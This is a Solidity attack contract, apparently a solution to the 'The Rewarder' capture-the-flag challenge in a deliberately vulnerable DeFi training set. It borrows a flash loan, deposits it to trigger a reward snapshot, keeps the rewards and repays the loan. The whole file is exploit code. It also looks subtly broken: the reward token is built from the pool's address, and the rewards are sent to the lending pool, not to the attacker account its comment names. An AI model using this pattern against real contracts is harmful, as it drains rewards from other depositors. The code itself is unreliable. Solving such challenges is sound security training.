// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";

contract TheRewarderHack {
    FlashLoanerPool immutable flashLoanerPool;
    TheRewarderPool immutable rewarderPool;
    DamnValuableToken immutable liquidityToken;
    RewardToken immutable rewardToken;

    constructor(
        address _flashLoanerPool,
        address _token,
        address _rewarderPool
    ) {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(_token);
        rewardToken = RewardToken(_rewarderPool);
    }

    // Only start the exploit if TheRewarderPool's lastRecordedSnapshotTimestamp is older than 5 days!
    function attack() external {
        // Take a loan.
        flashLoanerPool.flashLoan(
            liquidityToken.balanceOf(address(flashLoanerPool))
        ); // Triggers callback.
    }

    // The flashloan callback.
    function receiveFlashLoan(uint256 amount) external {
        // Deposit all of the borrowed tokens.
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount); // Triggers snapshot and distribution of rewards.
        // Transfer rewards to attacker EOA.
        uint256 rewards = rewarderPool.distributeRewards(); // Doesn't have any effect but quickly gives us the amount of rewards.
        rewardToken.transfer(msg.sender, rewards);
        // Withdraw all of the liquidity tokens again.
        rewarderPool.withdraw(amount);
        // Pay back the flash loan.
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
